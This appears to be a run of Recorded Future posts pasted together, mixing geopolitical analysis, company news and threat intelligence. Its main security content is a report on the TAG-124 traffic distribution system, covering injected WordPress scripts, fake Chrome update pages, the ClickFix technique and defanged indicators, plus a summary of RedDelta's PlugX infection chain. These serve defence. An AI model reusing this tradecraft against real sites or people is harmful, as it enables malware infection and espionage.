        <p>Although long-term public opinion trends in Taiwan <a href="https://esc.nccu.edu.tw/PageDoc/Detail?fid=7801&amp;id=6963">indicate</a> the majority of people are very unlikely to ever willingly support unification (discussed later in this report), polling results since 2020 likely suggest to China’s leadership that the military and other elements of its strategy are working to curb preferences for independence in the short term. Since 2020, support for maintaining the “status quo” has increased while moving “toward independence” has trended downward (an uptick in June 2024 notwithstanding). Further, support for maintaining the “status quo indefinitely” has risen since 2020 from 25.8% to 33.6%. Support for "independence as soon as possible” has also fallen from 6.6% to 3.8% in this same period. These results likely decrease the likelihood of an invasion given China’s very likely preference for solving domestic challenges and further preparing in case an invasion is deemed necessary.</p>
        <p>Insikt Group has not identified any trends in the US that would, in our assessment, decrease the likelihood of invasion in the short term.</p>

        <h2>Key Takeaways - What every cybersecurity expert needs to know</h2>
        <p>The Space Race 2.0 is well underway and accelerating rapidly. This white paper explores the key components shaping this modern space race and highlights how cyberattacks are already influencing its trajectory. Cyber operations will play a critical role in determining who dominates the second space race. As this new race accelerates, so too will the frequency and sophistication of cyberattacks targeting organisations operating in the space domain. Understanding how cyberattacks are reshaping this race is critical to protecting global economies, military operations, and the future of national security.</p>
        <h2>What is currently happening?</h2>
        <p>Nation-states are swiftly adapting their militaries to compete in space, a largely unregulated domain abundant with resources. History has shown that advanced nations often exploit new frontiers, and space is no exception. With its virtually limitless resources, space has become a critical battleground.</p>
        <p>Earth’s orbit is already highly contested, hosting satellites essential to global economies and military operations. Many of these satellites have been victims of cyberattacks, a trend that is certain to intensify. However, the focus extends beyond Earth’s ground stations and orbit, where we see espionage, destructive attacks, supply chain compromise, and signal hijacking. Nation-states are now setting their sights on deeper space, and that is where our attention must also turn.</p>
        <h2>What is going to happen?</h2>
        <p>The initial stage of Space Race 2.0 centers on Earth’s orbit, but the Moon, asteroids, and planets hold vast resources with the potential to transform nation-states in ways we can only begin to imagine. Efforts are already underway to colonize the Moon, mine asteroids, and establish a presence on habitable worlds beyond Earth.</p>

        <p>As these ambitions grow, so will efforts to outmaneuver rival nations. Cyber capabilities will play a critical role, as adversaries seek to steal information or disrupt operations. Ground stations, communication signals, and the supply chains supporting space assets are vulnerable to cyberattacks. As such, space-related organisations and companies must prioritize robust cybersecurity measures to protect their operations in this emerging domain. At an operational level, researchers are advancing frameworks like SPARTA to stay ahead of evolving tactics, techniques, and procedures</p>

        <p>At a nation-state level, militaries are increasingly integrating intelligence and cyber capabilities into their space operations, with U.S. Space Command serving as a prominent example.</p>
        <p>Conclusion This white paper explores the intersection of space exploration and cybersecurity, delving into the challenges and opportunities shaping this evolving frontier. The stakes could not be higher: dominance in cyberspace directly translates to dominance in outer space, where control will determine humanity’s future trajectory beyond Earth. As such, the convergence of space and cyber is critical and demands our full attention.</p>

        <h3>Location</h3>
        <p>Our Singapore office is a primary location for Southeast Asia and Taiwan. It supports clients across over 10 countries and is the second most significant region in APJ. Our office space is in the heart of Singapore at Funan Mall, facing the high court and parliament. It is near many fantastic activities, delicious grab-and-go food options, and some of the best restaurants in the country, with convenient access to a nearby train station connecting you to the entire city.</p>
        <div>
          <div>
            <div>“The Singapore office location has changed over the years. With each move, the preeminent issue is always ‘Are there good food options nearby?’ Because it’s Singapore, the answer is always ‘yes’. Exactly where and what kinds of options need to be mapped and analyzed at length before anyone can feel at home.”</div>

        <h3>Looking back</h3>
        <p>Recorded Future’s first office was in Garden City in the Central Business District at Asia Square. Since then, the team has grown significantly in size, scale, and reputation. Our expanding regional presence has led to a new office move, from the vibrant and historic area near Lau Pa Sat to Funan’s modern and exciting office towers.</p>
        <div>
          <div>
            <div>“When I arrived in Singapore, we had recently established what I’d consider our first ‘real’ office in APJ. It was in the heart of the central business district. We had just hired our first Account Executive and Business Development Representative in Singapore, and it felt like we had a full team at that point. Before that, the only persistent Recorded Future presence in Singapore was by our first Sales Engineer. He was our true and dedicated expeditionary force in the region.”</div>

        <h3>Onwards &amp; Upwards</h3>
        <p>For some time, the Singapore office was our sole physical presence in Asia. The team supported clients in 12 countries across 6 different time zones. The Singapore team now has over 30 employees. It spans various departments like sales, field marketing, professional services, and threat research.</p>
        <p>“The APJ team punches so far above their weight, it’s remarkable. With resilience and capability the Singapore team has achieved remarkable success and demonstrates consistent collaboration with our partners in EMEA and NA.” shares APJ’s former Intelligence Services Director.</p>

            <div><em>Analysis cut-off date: January 7, 2025</em></div>
          </div>
        </div>
        <p><em>NOTE: This report was updated on May 12, 2025, after it was discovered that TAG-124 is unrelated to 404TDS. All references to 404TDS as an alias belonging to TAG-124 have been removed.</em></p>
        <h2>Executive Summary</h2>
        <p>Insikt Group has identified multi-layered infrastructure linked to a traffic distribution system (TDS) tracked by Recorded Future as TAG-124, which overlaps with threat activity clusters known as LandUpdate808, KongTuke, and Chaya_002. TAG-124 comprises a network of compromised WordPress sites, actor-controlled payload servers, a central server, a suspected management server, an additional panel, and other components. The threat actors behind TAG-124 demonstrate high levels of activity, including regularly updating URLs embedded in the compromised WordPress sites, adding servers, refining TDS logic to evade detection, and adapting infection tactics, as demonstrated by their recent implementation of the ClickFix technique.</p>
        <p>Insikt Group identified multiple threat actors using TAG-124 within their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others. Notably, the shared use of TAG-124 reinforces the <a href="https://blog.talosintelligence.com/emerging-interlock-ransomware/">connection</a> between Rhysida and Interlock ransomware, which are already linked through similarities in tactics, tools, encryption behaviors, ransom note themes, code overlaps, and data exfiltration techniques. Insikt Group expects that TAG-124 will continue its operations within the increasingly sophisticated and specialized cybercriminal ecosystem, enhance its effectiveness, and attract additional users and partners.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group identified multi-layered infrastructure linked to a TDS tracked as TAG-124. This infrastructure includes a network of compromised WordPress sites, likely actor-controlled payload servers, a central server, a suspected management server, and an additional panel, among other components.</li>
          <li>The threat actor(s) associated with TAG-124 appear highly active, regularly updating URLs on compromised WordPress sites to evade detection, adding new servers to their infrastructure, and improving TDS-linked conditional logic and infection tactics.</li>
          <li>Multiple threat actors are assessed to incorporate TAG-124’s service into their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others.</li>
          <li>While Rhysida and Interlock ransomware have been associated with each other due to similarities in tactics, tools, encryption behaviors, ransom note themes, overlaps in code, and data exfiltration techniques, the shared use of TAG-124 reinforces this connection.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-124, which overlaps with LandUpdate808, KongTuke, and Chaya_002, is a TDS used to distribute malware on behalf of various threat actors, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, and TA582, among others (<a href="https://malasada.tech/the-landupdate808-fake-update-variant/">1</a>, <a href="https://x.com/GroupIB_TI/status/1790230870684828047">2</a>, <a href="https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/">3</a>). A TDS typically <a href="https://www.ncsc.gov.uk/files/White-paper-Ransomware-extortion-and-the-cyber-crime-ecosystem.pdf">refers</a> to a system used to analyze and redirect web traffic based on parameters like geolocation or device type, funneling only specific visitors to malicious destinations such as phishing sites, malware, or exploit kits, while evading detection and optimizing cybercriminal campaigns.</p>
        <p>More specifically, TAG-124 operates by injecting malicious JavaScript code into compromised WordPress websites. When visitors access an infected website, they unknowingly load attacker-controlled resources designed to manipulate them into completing actions that result in the download and execution of malware. TAG-124 often deceives victims by presenting the malware as a required Google Chrome browser update.</p>
        <p>In more recent variations, TAG-124 has been <a href="https://malasada.tech/updated-landupdate808-analysis/">observed</a> using the ClickFix technique. This approach displays a dialog instructing visitors to execute a command pre-copied to their clipboard. Once a visitor runs the command, it initiates a multi-stage process that downloads and executes the malware payload.</p>
        <h2>Threat Analysis</h2>
        <h3>TAG-124</h3>
        <p>Insikt Group identified multi-layered infrastructure associated with the TDS TAG-124. This infrastructure comprises a network of compromised WordPress sites, likely actor-controlled payload servers, a central server whose exact purpose remains unclear at the time of analysis, a suspected management server, and an additional management panel. If visitors fulfill specific criteria, the compromised WordPress websites display fake Google Chrome update landing pages, which ultimately lead to malware infections as discussed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.gfx3d1cfkcni">Users of TAG-124</a> section of this report (see <strong>Figure 1</strong>).</p>

        </div>
        <h4>Compromised WordPress Websites</h4>
        <p>TAG-124’s infrastructure consists of an extensive network of WordPress websites (see <strong>Appendix A</strong>). These websites appear to lack a consistent theme regarding industry, topic, or geography, suggesting they were likely compromised opportunistically through exploits or by acquiring credentials, such as those obtained via infostealers.</p>
        <h5>First-Stage WordPress Websites in Initial Delivery</h5>
        <p>The compromised websites of the first stage in the initial delivery phase typically include a script tag with an async attribute at an arbitrary location in the document object model (DOM), enabling the loading of an external JavaScript file in parallel with the page to avoid rendering delays (see <strong>Figure 2</strong>).</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="Script tag in DOM used to load external JavaScript file" src="https://www.recordedfuture.com/media_14d76df3a13a589e6b0580eb03c41480ad4bf376c.png?width=750&amp;format=png&amp;optimize=medium" width="731" height="43" />
            </div>
          </div>
          <div>
            <div><strong><em>Figure 2</em></strong><em>: Script tag in DOM used to load external JavaScript file (Source:</em> <em><a href="https://urlscan.io/result/eaa33803-1435-44c9-949f-3d707f51da4a">URLScan</a>)</em></div>
          </div>
        </div>
        <p>The JavaScript filename has changed frequently over time, with earlier names following recognizable patterns (such as metrics.js) and more recent ones <a href="https://threatfox.abuse.ch/ioc/1353344/">appearing</a> to be randomly formatted (such as hpms1989.js). Example filenames include:</p>
        <ul>
          <li>3561.js</li>
          <li>365h.js</li>
          <li>e365r.js</li>
          <li>hpms1989.js</li>
          <li>metrics.js</li>
          <li>nazvanie.js</li>
          <li>web-analyzer.js</li>
          <li>web-metrics.js</li>
          <li>web.js</li>
          <li>wp-config.js</li>
          <li>wp.js</li>
        </ul>
        <p>Notably, the threat actors appear to be regularly updating the URLs on the compromised websites. For instance, the website associated with <em>www[.]ecowas[.]int</em> has consistently changed the URL used to fetch the JavaScript file. This behavior indicates that the threat actors maintain ongoing access to these WordPress sites and frequently alter the URLs, including the domain and JavaScript filename, likely to evade detection.</p>
        <p>Although many of the compromised WordPress websites appear to be associated with lesser-known organizations, Insikt Group identified notable cases, including a subdomain linked to the Polish Centre for Testing and Certification, <em>www[.]pcbc[.]gov[.]pl</em>, and the domain of the Economic Community of West African States (ECOWAS) (<em>www[.]ecowas[.]int</em>). Both have been compromised and used in TAG-124 campaigns.</p>
        <h5>Final Stage WordPress Websites in Initial Delivery</h5>
        <p>If visitors meet specific criteria, which could not be fully determined, the compromised WordPress domains typically present fake Google Chrome update landing pages. These pages prompt users to click a download button, triggering the download of the actual payload from designated endpoints on a secondary set of compromised WordPress websites, including but likely not limited to:</p>

        <h5>Fake Google Chrome Update Landing Pages</h5>
        <p>Insikt Group discovered two variants of fake Google Chrome update landing pages associated with TAG-124 (see <strong>Figure 3</strong>). According to URLScan submission data, Variant 1 has been active longer, with its earliest submission recorded on April 24, 2024.</p>

        <p>Only victims meeting a specific set of still unknown conditions are directed to the fake Google Chrome update landing page, resulting in the observation of only a limited number of domains (see <strong>Table 1</strong>). These domains can be attributed to TAG-124 based on the URLs embedded in the DOM, public reporting, or other indicators. Notably, the threat actors consistently <a href="https://urlscan.io/result/9cd82562-c413-42e3-bb9a-23ca696c610e/dom">misspell</a> the word “referer” as “refferer” in the query parameter, a typographical error <a href="https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/">observed</a> in earlier reports.</p>

        <p><strong><em>Table 2</em></strong><em>: Additional domains found via visual similarity search (Source: Recorded Future)</em></p>
        <p>The domain update-chronne[.]com, hosted behind Cloudflare, appears to be owned by the threat actors as it directly impersonates Google Chrome (see <strong>Figure 4</strong>). At the time of analysis, the domain was still active, indexed by Google Search, and hosted the file Release.zip, which was <a href="https://pro.urlscan.io/result/6cab995d-f9ac-4bf4-81fb-9286825ce9db">identified</a> as REMCOS RAT.</p>

        </p>
        <p>Notably, when a victim clicks the “Update Chrome” button, the website redirects to <em>downloading[.]bplnetempresas[.]com</em>, which shows the IP address <em>146.70.41[.]191</em> combined with three different ports (see <strong>Figure 5</strong>). This IP address has previously been <a href="https://threatfox.abuse.ch/ioc/1331058/">associated</a> with REMCOS RAT.</p>

        </div>
        <p>Additionally, the domain hosted a file named moc.txt, containing a PowerShell script designed to download and execute the contents of Release.zip (see <strong>Figure 6</strong>).

        <h5>Suspected Shell Website</h5>
        <p>Both <em>update-chronne[.]com</em> and <em>downloading[.]bplnetempresas[.]com</em> hosted a website seemingly associated with "YSOFEL", which appears to be a Brazilian organization (see <strong>Figure 7</strong>). However, no information about this organization could be found online, indicating that it is likely a fictitious entity.</p>

        <p>Insikt Group identified several other domains, some of which are noted in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.b0ml5ohdkzhk">Compromised WordPress Websites</a> section (such as mktgads[.]com), while others appear to impersonate Google (such as <em>check-googlle[.]com</em>) (see <strong>Table 3</strong>). This suggests that the website may function as a "shell website", potentially used to age domains or to display content only when visitors meet specific criteria.</p>

        <p><strong><em>Table 3</em></strong><em>: Domains linked to the same suspected “shell website” linked to the fake Brazilian organization referenced above (Source: Recorded Future)</em></p>
        <p>It remains uncertain whether all the domains in <strong>Table 3</strong> are malicious or connected to the same activity. However, their shared hosting of the same website, impersonation of other brands (such as ChainList), and partial verification of links to infections make them, at the very least, suspicious.</p>
        <h5>TAG-124 Delivery Servers</h5>
        <p>TAG-124 leverages compromised WordPress websites for various components of its infection chains. The servers embedded in the DOMs of these compromised first-stage WordPress sites, as detailed in the First-Stage WordPress Websites in Initial Delivery section, are likely owned by the threat actors. Insikt Group identified a significant network of servers connected to and likely controlled by the TAG-124 threat actors (see <strong>Table 4</strong>).</p>

        <p><strong><em>Table 4</em></strong><em>: Likely threat actor-controlled TAG-124 delivery servers (Source: Recorded Future)</em></p>
        <p>Most of the domains began resolving in November 2024, suggesting that TAG-124 gained momentum during this period, with the majority of the domains still active at the time of analysis. Of note, two domains hosted on <em>45[.]61[.]136[.]67</em>, namely <em>piedsmontlaw[.]com</em> and <em>pemalite[.]com</em>, were already resolving to this IP address in 2022, indicating that the server may have already been under the control of the threat actor during that time.</p>
        <h5>Suspected Higher-Tier Infrastructure</h5>
        <p>The majority of the suspected threat actor-controlled TAG-124 delivery servers, as listed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.78m3kdx91knq">TAG-124 Delivery Servers</a> section, have been seen communicating with a server over TCP port 443 (see <strong>Figure 1</strong>). The configurations of this server are similar to those of the delivery servers and host a domain that returns only a generic HTML page when accessed. At the time of analysis, Insikt Group could not determine the exact purpose of this server but suspects it plays a central role in the operation. One possibility is that it contains the core logic of the TDS.</p>
        <p>Additionally, Insikt Group identified a suspected management server linked to TAG-124. This server has been observed communicating with the delivery servers via TCP ports 80 and 443. It has also interacted with another panel linked to TAG-124, referred to as the "Ads Panel", whose purpose includes serving the latest delivery server through a specified endpoint, among others (see <strong>Figure 1</strong>).</p>

        <h2>Explore our 2024 Threat Analysis and 2025 Predictions</h2>
        <p>In 2024, two key trends defined the cybersecurity landscape: the resilience of cybercriminal networks despite law enforcement actions and the growing complexity of enterprise attack surfaces. In addition, state-sponsored threat actors, primarily linked to China and Russia, intensified their focus on critical infrastructure and leveraged generative AI to conduct influence operations to advance their geopolitical objectives.</p>
        <p>Recorded Future’s just-released threat report explores these trends and more. It presents the industry’s most comprehensive analysis of intelligence from 2024 as well as predictions to prepare your security organization for the year ahead.</p>
        <p>Read on for a summary of key topics and themes, and then <a href="https://go.recordedfuture.com/hubfs/reports/cta-2025-0128.pdf">download the full report</a> for an in-depth look at the adversary’s TTPs so you can strengthen your security posture.</p>
        <h3>Top Themes from our 2024 Research</h3>
        <p><strong>Theme #1: Extortion Groups Proliferated Despite Law Enforcement Action</strong></p>
        <p>Despite significant global law enforcement efforts targeting ransomware groups like <a href="/blog/lockbit-launches-ransomware-blog">LockBit</a> and <a href="/research/latin-american-governments-targeted-by-ransomware">ALPHV</a>, cybercriminals demonstrated their ability to adapt and thrive. They reorganized, leveraged leaked malware builders, and shifted to smaller, independent groups. By mid-2024, ransomware payments had already reached $459.8 million, with a record $75 million paid by a single victim.</p>
        <p><strong>Theme #2: Growing Adoption of SaaS Led to More Identity Exploits</strong></p>
        <p>Organizations now use an average of 371 SaaS applications, up significantly from 2021, with each application requiring its own access credentials. This increase in SaaS reliance gave threat actors more opportunities to exploit stolen or exposed credentials, which were implicated in high-profile breaches such as those at Snowflake and Change Healthcare. In both cases, attackers used stolen credentials obtained through infostealer malware to bypass single sign-on (SSO) protections.</p>
        <p><strong>Theme #3: State-sponsored Influence Operations Escalated</strong></p>
        <p>State-sponsored threat actors, including those <a href="/research/from-coercion-to-invasion-the-theory-and-execution-of-china-cyber-activity">linked to China</a>, Russia, and Iran, escalated their activities in 2024. These operations targeted critical infrastructure and leveraged generative AI to conduct influence campaigns during key elections.</p>
        <p>China’s Volt Typhoon group pre-positioned itself in US critical infrastructure, raising concerns about its potential for strategically timed cyberattacks. Meanwhile, Russia and Iran used generative AI to accelerate the creation and dissemination of inauthentic content aimed at influencing public opinion and destabilizing democracies worldwide.</p>
        <p><strong>Theme #4: Tactics and Techniques Emphasized Defense Evasion</strong></p>
        <p>Threat actors increasingly employed advanced tactics to evade detection. Malware targeting macOS and Linux systems surged, reflecting the growing use of these platforms in enterprise environments. Tools like RustDoor and <a href="/research/the-travels-of-markopolo-self-proclaimed-meeting-software-vortax-spreads-infostealers">AMOS</a> exploited cross-platform functionality to deliver sophisticated payloads, while ransomware groups targeted critical hypervisors such as VMware ESXi.</p>
        <p>Defense evasion techniques, such as reflective code loading and the abuse of remote monitoring tools, became more prevalent. These methods enabled attackers to bypass endpoint detection and response (EDR) solutions.</p>
        <h3>Top Insikt Group Predictions for 2025</h3>
        <p><strong>#1: AI Impersonation will be the Next Big Attack Vector for SaaS Applications</strong></p>
        <p><a href="/research/insikt-group">Insikt Group</a> expects that a major breach will very likely result from one of two AI-associated factors: implementation of generative AI into enterprise workflows or abuse of AI for effective impersonation. In either case, it is likely that a SaaS application will play a role in initial access or data exposure.</p>
        <p><strong>#2: Additional Typhoon Activity will Affect New Sectors</strong></p>
        <p>Insikt Group predicts that more high-profile breaches of US critical infrastructure by <a href="/research/chinese-apt-groups-target-afghan-telecommunications-firm">China-linked APTs</a> will be disclosed in 2025, expanding beyond the energy and telecommunications sectors. These breaches are likely aimed at pre-positioning for disruptive operations.</p>
        <p><strong>#3: macOS and Mobile Threats Join Windows and Cloud</strong></p>
        <p>Insikt Group forecasts that one of the high-impact cyber incidents of 2025 will likely be associated with either macOS malware or mobile malware. This will result from certain environmental factors reaching breaking points, such as higher attention to macOS targets and increased access to sensitive corporate and financial data via mobile devices.</p>
        <p><strong>#4: Crypto Fraud Will Lead to a Market-destabilizing Event</strong></p>
        <p>The soaring value of cryptocurrency, as well as an incoming US administration set to pursue crypto-friendly policies, will drive more aggressive and ambitious fraud attempts. Inskit Group predicts that criminals will likely be emboldened by the crypto boom to carry out market-destabilizing scams that will at least temporarily reduce the value of cryptocurrencies and lead to calls to restrict their use.</p>

        </p>
        <h2>Summary</h2>
        <p>The 2024 Payment Fraud Intelligence Report from Recorded Future highlights a year of significant evolution in the fraud landscape, setting the stage for challenges in 2025. Key findings include a surge in stolen card data, with 269 million records posted across dark and clear web platforms, and a tripling of <a href="/blog/magecart-attacks-the-dark-art-fraudsters-use-to-steal-payment-data">Magecart e-skimmer infections</a> due to vulnerabilities like CosmicSting. Scam e-commerce and dark web card validation activities also saw notable increases, reflecting growing sophistication among threat actors.</p>
        <p>Emerging trends indicate fraudsters’ increasing exploitation of modern payment technologies and social engineering to <a href="https://go.recordedfuture.com/hubfs/reports/cta-2022-0726.pdf">bypass anti-fraud measures</a>. Predictions for 2025 include a rise in digital e-skimming and scam e-commerce, continued activity on dark web marketplaces, and persistent check fraud in the United States. The report emphasizes the need for financial institutions, merchants, and payment providers to adopt fusion intelligence strategies and rigorous verification processes to combat fraud effectively.</p>
        <h2>Key Highlights from 2024</h2>
        <h3>Surge in Stolen Data</h3>
        <p>In 2024, 269 million card records and 1.9 million stolen US bank checks were posted on dark and clear web platforms. This surge reflects a combination of increased data compromise events and rampant reposting. Notably, card-not-present (CNP) data dominated, signaling the growing impact of e-commerce fraud.</p>
        <h3>Magecart E-Skimmer Infections</h3>
        <p>The volume of Magecart e-skimmer infections surged, reaching nearly 11,000 unique e-commerce domains—a threefold increase from 2023. This spike was driven by the CosmicSting vulnerability (CVE-2024-34102), alongside the use of out-of-the-box e-skimmer kits like “<a href="/research/h1-2024-malware-and-vulnerability-trends-report">Sniffer by Fleras</a>.”</p>
        <h3>Scam E-Commerce Websites</h3>
        <p>Nearly 1,200 scam domains were linked to fraudulent merchant accounts, with most registered in the United Kingdom and Hong Kong. Operators of these scams leveraged social engineering tactics and linked merchant accounts to defraud victims and monetize stolen data.</p>
        <h3>Dark Web Activity</h3>
        <p><a href="/blog/improving-dark-web-investigations-with-threat-intelligence">Dark web</a> marketplaces remained central to the fraud ecosystem, offering stolen card data and facilitating fraud workflows. Telegram, despite recent disruptions, continued to be a source of unique fraud data.</p>
        <h2>Trends to Watch in 2025</h2>
        <h3>Digital E-Skimming and Scam E-Commerce</h3>
        <p>Fraudsters will increasingly target e-commerce platforms using advanced e-skimmer tactics and <a href="/research/scam-websites-take-advantage-of-seasonal-openings">scam websites</a>. The adoption of digital wallets will further expose vulnerabilities in payment ecosystems, particularly through OTP interception techniques.</p>
        <h3>Dark Web Marketplaces</h3>
        <p>Despite law enforcement efforts, <a href="/blog/dark-web-threats">dark web marketplaces</a> will continue to thrive, offering anonymity and scalability. Platforms like Telegram will remain active, though less experienced threat actors may dominate these channels.</p>
        <h3>Persistent Check Fraud</h3>
        <p>The explosion of check fraud in the United States is unlikely to subside in 2025. However, advancements in prevention methods, including intelligence-driven strategies, will help financial institutions reduce losses.</p>
        <h2>Mitigation Strategies</h2>
        <ul>
          <li>Encourage acquired merchants to identify and close vulnerabilities on e-commerce websites that threat actors can exploit to implant Magecart e-skimmer infections.</li>
          <li>Increase the rigor of merchant onboarding processes to deter threat actors seeking to fraudulently acquire merchant accounts.</li>
          <li>Enhance validation requirements for digital wallet provisioning attempts.</li>
          <li>Implement push provisioning through online banking applications.</li>
          <li>Leverage Recorded Future Intelligence:
            <ul>
              <li>Establish intelligence feedback loops to align cybersecurity and anti-fraud teams for proactive fraud detection and prevention.</li>
              <li>Utilize Recorded Future insights to identify at-risk accounts, breached merchants, and fraudulent activities involving Magecart e-skimmers, scam merchants, tester merchants, and stolen checks.</li>
              <li>Use structured data and transaction analysis to automate workflows, block high-risk merchants, and implement fraud controls.</li>
              <li>Continuously fine-tune fraud prevention tactics using threat landscape data and internal input.</li>
            </ul>

        <h2>Summary:</h2>
        <p>Between July 2023 and December 2024, Insikt Group observed the Chinese state-sponsored group RedDelta targeting Mongolia, Taiwan, Myanmar, Vietnam, and Cambodia with an adapted infection chain to distribute its customized PlugX backdoor. The group used lure documents themed around the 2024 Taiwanese presidential candidate Terry Gou, the Vietnamese National Holiday, flood protection in Mongolia, and meeting invitations, including an Association of Southeast Asian Nations (ASEAN) meeting. RedDelta likely compromised the Mongolian Ministry of Defense in August 2024 and the Communist Party of Vietnam in November 2024. The group conducted spearphishing targeting the Vietnamese Ministry of Public Security, but Insikt Group observed no evidence of successful compromise. From September to December 2024, RedDelta likely targeted victims in Malaysia, Japan, the United States, Ethiopia, Brazil, Australia, and India.</p>
        <p>In late 2023, RedDelta evolved the first stage of its infection chain to leverage a Windows Shortcut (LNK) file likely delivered via spearphishing. In 2024, the group transitioned to using Microsoft Management Console Snap-In Control (MSC) files. Most recently, RedDelta used spearphishing links to prompt a victim to load an HTML file remotely hosted on Microsoft Azure. Since July 2023, RedDelta has consistently used the Cloudflare content distribution network (CDN) to proxy command-and-control (C2) traffic, which enables the group to blend in with legitimate CDN traffic and complicates victim identification. Other state-sponsored groups, including Russia’s BlueAlpha, have similarly leveraged Cloudflare to evade detection.</p>
        <p>RedDelta’s activities align with Chinese strategic priorities, focusing on governments and diplomatic organizations in Southeast Asia, Mongolia, and Europe. The group’s Asia-focused targeting in 2023 and 2024 represents a return to the group’s historical focus after targeting European organizations in 2022. RedDelta’s targeting of Mongolia and Taiwan is consistent with the group’s past targeting of groups seen as threats to the Chinese Communist Party’s power.</p>
        <h2>About RedDelta:</h2>
        <p>RedDelta has been active since at least 2012 and has focused on targeting Southeast Asia and Mongolia. The group has routinely adapted its targeting in response to global geopolitical events. <a href="/research/reddelta-targets-catholic-organizations">RedDelta targeted the Vatican and other Catholic organizations</a> with PlugX before 2021 talks between China and the Vatican. The has group <a href="/research/reddelta-cyber-threat-operations">compromised</a> law enforcement and government entities in India, a government organization in Indonesia, and other targets across Myanmar, Hong Kong, and Australia.</p>
        <p>In 2022, <a href="/research/reddelta-targets-european-government-organizations-continues-iterate-custom-plugx-variant">RedDelta shifted toward increased targeting of European government and diplomatic entities</a> following Russia's invasion of Ukraine. This activity used an infection chain that began by delivering an archive file (ZIP, RAR, or ISO), which was likely delivered via spearphishing. The file contained a Windows Shortcut (LNK) file disguised with a double extension (such as .doc.lnk) and a Microsoft Word icon. Hidden folders within the archive contained three files used to complete dynamic-link library (DLL) search order hijacking: a legitimate binary, a malicious DLL loader, and an encrypted PlugX payload that was ultimately loaded into memory. User execution of the Shortcut file led to DLL search order hijacking. In November 2022, RedDelta evolved its tactics to stage the ISO file on a threat actor-controlled domain.</p>
        <p>In March 2023, Insikt Group identified RedDelta targeting Mongolia using a similar infection chain that started with a container file (RAR, ZIP, ISO) consisting of an LNK file that triggered a DLL search order hijacking triad located within a hidden nested subdirectory. Decoy documents included an invitation from the World Association of Mongolia and a document claiming to be a BBC news interview about Tibetan Buddhism and Mongolia. RedDelta targeted:</p>
        <ul>
          <li>Members of multiple Mongolian non-governmental organizations (NGOs), including a human rights and pro-democracy NGO focused on the Inner Mongolia Autonomous Region</li>
          <li>Mongolian Buddhist activists in Mongolia and Japan</li>
          <li>Academic professionals in Mongolia and Japan</li>
          <li>Developers of two Mongolian mobile applications</li>
        </ul>
        <h2>Mitigations:</h2>
        <p>To detect and mitigate RedDelta activity, organizations should:</p>
        <ul>
          <li>Use YARA and Sigma rules provided by Insikt Group to detect RedDelta Windows Installer (MSI), DLL, and LNK files (see below).</li>
          <li>Configure intrusion detection systems (IDS), intrusion prevention systems (IPS), and other network defense mechanisms to alert on or block connection attempts from external IP addresses and domains associated with RedDelta (see below).</li>
          <li>Keep software and applications — particularly operating systems, antivirus software, and core system utilities — up to date.</li>
          <li>Filter email correspondence and scrutinize attachments for malware.</li>
          <li>Conduct regular system backups and store them offline and offsite to ensure they are inaccessible via the network.</li>
          <li>Adhere to strict compartmentalization of company-sensitive data, institute role-based access, and limit company-wide data access.</li>
          <li>Deploy client-based host logging and intrusion detection capabilities to identify and thwart attacks early.</li>
          <li>Prevent threat actors from bypassing security by disabling outdated authentication methods.</li>
          <li>Implement tools like network IDS, NetFlow collection, host logging, and web proxy, alongside manual monitoring of detection sources.</li>
          <li>Practice network segmentation and ensure special protections exist for sensitive information, such as multifactor authentication, and restricted accesss.</li>
        </ul>
        <p>Leverage the <a href="/products/third-party-intelligence">Recorded Future® Third-Party Intelligence module</a> and <a href="/platform/browser-extension">Threat Intelligence Browser Extension</a> for real-time monitoring and prioritized vulnerability patching.</p>
        <p>Review public guidance (<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a">1</a>, <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a">2</a>, <a href="https://media.defense.gov/2019/Oct/07/2002191601/-1/-1/0/Mitigating%20Recent%20VPN%20Vulnerabilities%20-%20Copy.pdf">3</a>, <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-258a">4</a>) and Insikt Group’s <a href="/research/charting-chinas-climb-leading-global-cyber-power">“Charting China’s Climb as a Leading Global Cyber Power”</a> report for comprehensive recommendations for mitigating Chinese advanced persistent threat activity more broadly.</p>
        <h2>Outlook:</h2>
        <p>Insikt Group anticipates that RedDelta will continue targeting organizations worldwide with its customized PlugX backdoor, focusing on Southeast Asia and China’s periphery, including Mongolia and Taiwan. Likely targets include governments, NGOs, activists, and religious organizations. RedDelta has continually evolved its infection chain and is anticipated to continue doing so in the future in response to major geopolitical developments.</p>

            <description><![CDATA[Discover our 2024 Hispanic Heritage Month series: overcoming adversity, fostering community, and empowering growth through inclusion.]]></description>
            <content:encoded><![CDATA[
        <p>This year, our Hispanic Heritage Month program features a three-part series led by <a href="https://notainclusion.com/">Nota Inclusion</a> speakers. Futurists are invited to participate in virtual development sessions covering themes like overcoming adversity, unlocking personal potential, and harnessing the power of connection.</p>
        <p><a href="/blog/erg-stories-hispanic-heritage-month-2024">In part one</a>, Mando Origel, Recorded Future’s Latin Network ERG lead and Customer Success Manager, shared his inspiration for organizing these events and what he felt was the most important part of the ERG work: making meaningful connections.</p>

